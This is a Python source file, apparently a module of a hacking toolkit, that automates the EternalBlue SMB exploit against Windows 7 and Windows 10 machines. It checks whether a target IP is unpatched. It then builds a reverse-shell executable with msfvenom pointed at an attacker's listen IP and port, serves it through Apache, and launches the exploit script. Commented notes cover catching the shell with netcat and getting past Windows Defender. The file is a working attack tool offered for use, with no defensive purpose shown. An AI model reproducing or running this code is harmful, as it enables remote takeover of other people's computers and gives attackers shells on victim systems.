# EternalBlue V 1.1 4/29/22

import os
import subprocess as sp
import time

#Stuff
def reload():
	#pwd = sp.getoutput('pwd')
	#os.system('python3 ' + pwd + '.py')
	os.system('python3 Modules/attack/systemaccess/eternalblue/module_eternalblue.py')

print("""
                                                                                                                
@@@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @@@  @@@   @@@@@@   @@@          @@@@@@@   @@@       @@@  @@@  @@@@@@@@  
@@@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@@  @@@          @@@@@@@@  @@@       @@@  @@@  @@@@@@@@  
@@!         @@!    @@!       @@!  @@@  @@!@!@@@  @@!  @@@  @@!          @@!  @@@  @@!       @@!  @@@  @@!       
!@!         !@!    !@!       !@!  @!@  !@!!@!@!  !@!  @!@  !@!          !@   @!@  !@!       !@!  @!@  !@!       
@!!!:!      @!!    @!!!:!    @!@!!@!   @!@ !!@!  @!@!@!@!  @!!          @!@!@!@   @!!       @!@  !@!  @!!!:!    
!!!!!:      !!!    !!!!!:    !!@!@!    !@!  !!!  !!!@!!!!  !!!          !!!@!!!!  !!!       !@!  !!!  !!!!!:    
!!:         !!:    !!:       !!: :!!   !!:  !!!  !!:  !!!  !!:          !!:  !!!  !!:       !!:  !!!  !!:       
:!:         :!:    :!:       :!:  !:!  :!:  !:!  :!:  !:!   :!:         :!:  !:!   :!:      :!:  !:!  :!:       
 :: ::::     ::     :: ::::  ::   :::   ::   ::  ::   :::   :: ::::      :: ::::   :: ::::  ::::: ::   :: ::::  
: :: ::      :     : :: ::    :   : :  ::    :    :   : :  : :: : :     :: : ::   : :: : :   : :  :   : :: ::   
                                                                                                               """) ## poison font 

print('''
OPTIONS:

a) Windows 7, Requirements: Valid Username + Password\n
b) Windows 10, Requirements: Valid Username + Password\n 
	
Note!:
You must set up a listener to recieve the shells, a built-in one is coming in future updates

---------------\n
h) Help
w) quit to Attack Mode
q) Exit to HackBox\n
---------------\n
x) Attack Mode
y) Defense Mode
z) Recon Mode\n

Enter an option:    ''')
#(win10: DevNOte: need different payload to get around win defender, + have the sc.exe end up in c: instead of downloads, or just trigger from downloasd, make Eternal_Blue_10 folder under exploits)

statement = input().lower()

while True:
## --  Windows 7 Eternal Blue -- ##
	if statement == 'a':

		## add some code to generate a default payload with msfvenom or something
		print('\nEnter Target IP\n')
		targetIP = input()
		## Checker ##
		checker = sp.getoutput('python2 Modules/attack/exploits/Eternal_Blue_7/checker.py ' + targetIP)
		print("\nChecking if target is vulnerable...\n")
		if 'The target is not patched' in checker:
			print("Target is vulnerable!\n")
		else:
			print("Target is NOT vulnerable :( reloading...")
			time.sleep(2)
			os.system('clear')
			reload()
		print("- - - - - - - - - -")	
		print('\nEnter Listen IP\n')
		listenIP = input()
		print('\nEnter Listen Port\n')
		listenPORT = input()
		#print('Enter payload')
		#payload = input.() --- -- This will need some work with SED or something similar - or just echo in the payload code?
		os.system('rm -rf /var/www/html/sc.exe')
		print("- - - - - - - - - -")	
		print('\nStarting Apache server (to serve payload)...\n')
		os.system('systemctl restart apache2\n')
		print('Building Payload...\n')
		# saving listenIP to temp
		f = open("Modules/attack/systemaccess/eternalblue/listenIP_temp", "w")
		f.write(listenIP)
		f.close()
		# saving listenPORT to temp
		f = open("Modules/attack/systemaccess/eternalblue/listenPORT_temp", "w")
		f.write(listenPORT)
		f.close()
		
		#Removing old listener, and adding  new one to web server
		os.system('msfvenom -p windows/shell_reverse_tcp LHOST=' + listenIP + ' LPORT=' + listenPORT + ' -i 10 -f exe > /var/www/html/sc.exe')
		print('\n')

		# running exploit
		os.system('python2 Modules/attack/exploits/Eternal_Blue_7/eternalblue.py ' + targetIP)
		#print('\n -- If the exploit completed correctly, a shell should appear below -- \n')
		#listening and opening shell
		#os.system('nc -nvlp ' + listenPORT)
## --  Windows 10 Eternal Blue -- ##
	if statement == 'b':
		print('\nEnter Target IP\n')
		targetIP = input()
		## -- Checker -- ##
		checker = sp.getoutput('python2 Modules/attack/exploits/Eternal_Blue_10/checker.py ' + targetIP)
		print("\nChecking if target is vulnerable...\n")
		if 'The target is not patched' in checker:
			print("Target is vulnerable!\n")
		else:
			print("Target is NOT vulnerable :( reloading...")
			time.sleep(2)
			os.system('clear')
			reload()
		print("- - - - - - - - - -")	
		print('\nEnter Listen IP\n')
		listenIP = input()
		print('\nEnter Listen Port\n')
		listenPORT = input()
		#print('Enter payload')
		#payload = input.() --- -- This will need some work with SED or something similar - or just echo in the payload code?
		os.system('rm -rf /var/www/html/sc.exe')
		print("- - - - - - - - - -")	
		print('\nStarting Apache server...\n')
		os.system('systemctl restart apache2\n')
		print('Building Payload...\n')
		## -- saving listenIP to temp -- ##
		f = open("Modules/attack/systemaccess/eternalblue/listenIP_temp", "w")
		f.write(listenIP)
		f.close()
		## -- saving listenPORT to temp -- ##
		f = open("Modules/attack/systemaccess/eternalblue/listenPORT_temp", "w")
		f.write(listenPORT)
		f.close()
		
		#Removing old listener, and adding  new one to web server
		os.system('msfvenom -p windows/shell_reverse_tcp LHOST=' + listenIP + ' LPORT=' + listenPORT + ' -i 10 -f exe > /var/www/html/sc.exe')
		print('\n')

		# running exploit
		os.system('python2 Modules/attack/exploits/Eternal_Blue_10/eternalblue.py ' + targetIP)
		#print('\n -- If the exploit completed correctly, a shell should appear below -- \n')
		#listening and opening shell
		#os.system('nc -nvlp ' + listenPORT)


# ----------- moving around ---------------------#
	elif statement=="h":
		print("""\n
EternalBlue! 

This module takes advantage of the infamous EternalBlue exploit. For now, only the windows7 version is included,
however more versions will be coming in the future. Note: you will need a valid login for the machine you are targeting for  the 
exploit to execute successfully!
				""")
	elif statement=="w":
		exec(open('Modules/attack/Attack.py').read()) 
	elif statement=="q":
		os.system('clear')
		exec(open('HackBox.py').read())   
		ans = None
# ------------ Mode Switch ----------------------#
	elif statement=="x":
		exec(open('Modules/attack/Attack.py').read()) 
	elif statement=="y":
		exec(open('Modules/defense/Defense.py').read()) 
	elif statement=="z":
		exec(open('Modules/recon/Recon.py').read()) 

	else:
		print("\nOption not found, type help for help")
		print("Enter an option:")
	statement = input().lower()




	statement = input().lower()
